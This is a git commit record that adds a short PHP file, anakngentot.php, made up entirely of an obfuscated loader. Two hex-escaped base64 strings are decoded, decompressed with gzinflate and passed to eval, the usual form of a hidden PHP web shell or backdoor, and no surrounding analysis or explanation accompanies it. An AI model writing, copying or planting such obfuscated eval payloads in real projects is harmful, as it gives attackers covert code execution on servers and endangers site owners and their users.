e706d5c4240786837a09ca87dfb86f41836946fb
smily1995 <hazeladitya77@gmail.com>
2025-07-23 18:41:04 +0700

    Create anakngentot.php

---
+++ anakngentot.php
@@ -0,0 +1,6 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "\x3do\x61kouy8J\x2br\x61\x42OIRYY/e\x617i\x414j\x62Rxy\x628\x41P4\x62d5\x62Xj1i\x62NeEWf5yjs2tfyM1OjO39VxTd5d08PPGMyTlTEi86jykq10kNxxyqQ7PMwR9l\x61kE8\x42M7sFKM\x63Dk6DZz/QqzdFR\x42Ep2uT8rYiUf7H\x63q1oY\x616uQWiYXfs8YP8I9v6PHg2dxlvpoyger\x63kmV/2O2Y2HTt1s4Nhy8zKriNP84UdLvyiilYmNYG4U9\x43frlS/sq\x41\x41U1QkQYwjnwquUhdEuxtJ\x42uriH\x4190/hkMfD58TDz/H8h\x63oo1\x62xGt1d8SZR0TqxtT1W\x61pg3h1q2uKsrEseL\x61wqryyiyW\x41dIMvL47G\x43\x42MErUwQW4/P\x41\x418\x42wJe/T\x41\x417Hg//H\x41\x41\x42wJe\x2bTf\x41LEg/vH\x41E\x42wJe\x2bTe\x41\x62Eg/fH\x41I\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
